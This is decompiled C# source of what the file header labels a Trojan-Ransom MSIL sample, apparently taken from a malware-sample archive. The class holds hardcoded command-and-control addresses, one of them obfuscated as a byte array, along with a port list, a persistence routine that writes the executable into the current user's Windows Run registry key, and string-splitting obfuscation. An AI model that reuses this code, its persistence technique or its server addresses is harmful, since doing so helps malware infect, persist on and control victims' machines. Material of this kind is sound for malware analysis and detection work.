// Decompiled with JetBrains decompiler
// Type: wardhmrias.DLAONIF
// Assembly: wardhmrias, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 08CBA86B-489B-4E7A-8D19-875058370078
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.04-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-5dcb736bf556729b30654fe97da034c1ccd7471f7587cb82dc33f4aef2248b9c.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Windows.Forms;

namespace wardhmrias
{
  internal static class DLAONIF
  {
    public static string wardhmriasappPtath = Application.ExecutablePath.ToString();
    public static string wardhmriasdefaudltP = "122.216.201.108|wardhmrias".Split('|')[0];
    public static string wardhmriasmaindApp = "wardhmrias|wardhmrias".Split('|')[0];
    public static int[] ports = new int[5]
    {
      8761,
      11214,
      6128,
      15822,
      17443
    };
    public static byte[] wardhmriasvptsips = new byte[15]
    {
      (byte) 49,
      (byte) 56,
      (byte) 53,
      (byte) 46,
      (byte) 49,
      (byte) 51,
      (byte) 54,
      (byte) 46,
      (byte) 49,
      (byte) 54,
      (byte) 57,
      (byte) 46,
      (byte) 49,
      (byte) 53,
      (byte) 53
    };
    public static int wardhmriaspodrt;
    public static string wardhmriaspc_itd = "elagb|wardhmrias".Split('|')[0];
    public static string wardhmriasremvdUser = "debdrivca|wardhmrias".Split('|')[0];
    public static string wardhmriasfilesdLtogs = "reldrdmr".Split('|')[0];

    public static string wardhmriasget_mdpath() => Path.GetDirectoryName(DLAONIF.wardhmriasappPtath) + "\\";

    public static void wardhmriasset_rdun(string app, string path)
    {
      try
      {
        string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|wardhmrias".Split('|')[0];
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, true);
        string wardhmriaspcItd = DLAONIF.wardhmriaspc_itd;
        object obj = registryKey.GetValue(wardhmriaspcItd + app);
        if (obj != null && !(obj.ToString() != path))
          return;
        registryKey.SetValue(wardhmriaspcItd + app, (object) path);
      }
      catch
      {
      }
    }

    public static byte[] getBytedArray(string value)
    {
      MemoryStream memoryStream = new MemoryStream();
      TextWriter textWriter = (TextWriter) new StreamWriter((Stream) memoryStream);
      textWriter.Write(value);
      textWriter.Flush();
      memoryStream.Flush();
      return memoryStream.ToArray();
    }

    public static string wardhmriasdOsname()
    {
      try
      {
        OperatingSystem osVersion = Environment.OSVersion;
        int num = osVersion.Version.Major;
        string str1 = num.ToString();
        num = osVersion.Version.Minor;
        string str2 = num.ToString();
        return str1 + ">" + str2;
      }
      catch
      {
        return "6>1!wardhmrias".Split('!')[0];
      }
    }
  }
}
